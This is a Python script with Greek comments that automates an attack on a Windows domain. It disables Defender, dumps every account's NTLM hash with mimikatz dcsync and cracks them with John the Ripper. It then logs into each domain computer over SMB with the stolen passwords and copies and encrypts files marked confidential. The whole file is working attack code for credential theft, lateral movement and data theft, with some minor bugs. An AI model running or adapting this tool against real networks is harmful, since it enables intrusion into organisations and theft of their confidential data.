from asyncio.windows_events import NULL
from bz2 import compress
from http.server import executable
from ipaddress import ip_address
from multiprocessing import connection
from multiprocessing.connection import Client
import os
from posixpath import basename
from pydoc import cli
from socket import timeout
import subprocess
import shutil
from xml import dom
from winrmcp import Client
from socket import *
import glob
import pyzipper

def execute_command(command):    
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out = process.communicate()[0]
    out = out.decode()
    
    return out

def zip_files(src, file_list, compress_lv, zip_password):
    archive = pyzipper.AESZipFile(src + 'files.zip', "w")
            
    archive.compression = pyzipper.ZIP_BZIP2    

    archive.encryption = pyzipper.WZ_AES

    archive.compresslevel = compress_lv

    archive.setpassword(zip_password)            

    for filename in file_list:

        archive.write(src + filename, basename(src + filename))
        
        os.remove(src + filename)

def get_files(f_str, newpath):
    
    file_list = []

    for src in glob.glob(f_str):        
        print('Received: ', src)
        shutil.copy(src, newpath)

        tmp = src.replace('\\', '/')
        src = tmp.split('/')[-1]

        file_list.append(src)
        
    return file_list

def main():
   
    pc_names = []    
    dict_ip = {}
    
    compress_lv = 5
    zip_password = b'123456'

    connection_timeout = 15

    # Άνοιγμα του φακέλου του project
    dir_path = os.path.dirname(os.path.realpath(__file__))
    os.chdir(dir_path) 
    cwd = os.getcwd()

    # Διαδρομη για το john, τα hash των χρηστων και το λεξικο
    jtr_executable = cwd + '\john-1.9.0-jumbo-1-win64\\run\john.exe'
    ntlmhashes = cwd + '\\ntlmhashes.txt'
    rockyou_wordlist = cwd + '\\rockyou.txt'
  
    # Εύρεση του domain name
    command = 'cmd /c "systeminfo | findstr Domain:"'
   
    tmp = execute_command(command)
    domain_name = tmp.split(' ')[-1].rstrip('\n\r')

    # Προσοχή kill στο proccess του defender
    command = f'AdvancedRun.exe /EXEFilename "%windir%\system32\wscript.exe" /CommandLine "{cwd}/disable_defender.vbs" /RunAs 8 /Run'   
    execute_command(command)
            
    # Εύρεση του hostname
    hostname = execute_command('hostname').rstrip('\r\n')
    
    # Ευρεση των hash με το mimikatz
    command = f'mimikatz-master/x64/mimikatz.exe \"lsadump::dcsync /dmain:{domain_name} /all /csv \" \"exit\"'
    out = execute_command(command)   

    lines = out.split("/all /csv")[1]

    # Δημιουργία αρχειου για την αποθηκευση των hash
    f = open("ntlmhashes.txt", "w")

    # προσπελαση των αποτελεσματων και εγγραφη στο αρχείο ntlmhashes
    for line in lines.split('\n'):
        
        tmp = line.split("\t")
        
        if tmp[0].isnumeric():
            
            f.write(tmp[1] + ':' + tmp[2] + '\n')
                   
            # Το mimikatz διαχωρίζει τους υπολογιστές από τους χρήστες βάζοντας το δολάριο στο τέλος
            if ('$' in tmp[1]):

                tmp = tmp[1].split('$')[0]
                pc_names.append(tmp)            

    f.close()

    pc_len = len(pc_names)
     
    print(f'There are {pc_len} pc\'s in your domain')
    
    # Eυρεση της ip των υπολογιστων
    for pc_name in pc_names:
        
        powershel_command = f'(Get-ADComputer {pc_name} -Properties IPv4Address).IPv4Address'
       
        ip = execute_command(["powershell", powershel_command])

        ip = ip.replace('\r\n', '')                       
                        
        dict_ip[pc_name] = ip

        print(pc_name, ' pc with ip: ', ip)
            
    # Διαγραφη προηγούμενων κωδικών
    command = 'del john-1.9.0-jumbo-1-win64\\run\john.pot'
    os.system(command)

    # Εκτέλεση του john the ripper για να βρουμε τον κωδικο που αντιστοιχει στο ntlm hash του κωδικου
    command = f"{jtr_executable} --format=NT {ntlmhashes} --wordlist={rockyou_wordlist}"
    
    jtr_result = execute_command(command)
    
    john_lines = jtr_result.split('\n')

    john_lines.pop(0)

    dict_user = {}
    
    f_str = f''

    total_users = 0

    # Αποθήκευση των ονομάτων και των κωδικών των χρηστών σε ένα λεξικό
    for line in john_lines:
        
        if ('(' in line):

            total_users = total_users + 1
            
            password = line.split(" ")[0]    
            
            username = line.split("(")[1]
            username = username.strip(')')

            f_str += f'User: {username} with password: {password}\n'
            
            dict_user[username] = password

    print(f'There are {total_users} users in your domain')
    print(f_str)

    total_files_received = 0

    connected = True

    for pc_name in pc_names:
        
        # Δεν δοκιμάζουμε να συνδεθούμε στο δικό μας υπολογιστή
        if (pc_name == hostname):
            continue

        ip = dict_ip[pc_name]

        print('Attempting to connect to pc:', pc_name)

        files_received = 0
    
        for username in dict_user.keys():

            password = dict_user[username]

            # Αποσύνδεση από όλους του υπολογιστες
            execute_command('net use /delete * /y')
            
            # Συνδεση στον υπολογιστή με έναν από τους χρήστες που βρέθηκαν
            command = f'net use \\\\{ip} /user:{domain_name}\\{username} {password}'

            try:
                subprocess.check_output(command, stderr=subprocess.PIPE, timeout = connection_timeout)
                connected = True
            except:
                print(f'Cannot connect to pc: {pc_name} with user: {username}')
                connected = False
          
            if connected:

                # Δημιουργία φακελου για την αποθηκευση των αρχείων
                newpath = cwd + '/PCFiles/' + pc_name + '/' + username
                newpath = newpath.replace('\\', '/')
                
                if not os.path.exists(newpath):
                    os.makedirs(newpath)
                
                file_list = []

                f_str1 = f'//{pc_name}.{domain_name}/c$/Users/{username}/*/*απόρρητο*.*'
                f_str2 = f'//{ip_address}/c$/Users/{username}/*/*απόρρητο*.*'
                
                # Αναζητηση αρχειων σε ολους τους φακελους του χρήστη    
                file_list = get_files(f_str1, newpath)

                # Σε περίπτωση όπου δεν βρεθούν αρχεία από το path του χρήστη, δοκιμάζουμε την ip του υπολογιστή
                if len(file_list) == 0:
                    file_list = get_files(f_str2, newpath)

                files_received += len(file_list)

                # Συμπίεση των αρχείων
                if len(file_list) > 0:

                    total_files_received += files_received

                    print(f'Received {len(file_list)} files from pc: {pc_name} and user: {username}')

                    pc_files_src = './PCFiles/' + pc_name + '/' + username + '/'
                    zip_files(pc_files_src, file_list, compress_lv, zip_password)           
            
        if files_received == 0:
            print(f'No files received from pc: {pc_name}')

    # Αποσύνδεση από όλους του υπολογιστες
    execute_command('net use /delete * /y')

    if total_files_received == 0:
        print('No files were received from any pc.')
        print(f'Network discovery might be disabled on client pc\'s of {domain_name}.')

    elif total_files_received > 0: 
        print(f'Received {total_files_received} files from domain: {domain_name}')

if __name__ == '__main__':
    main()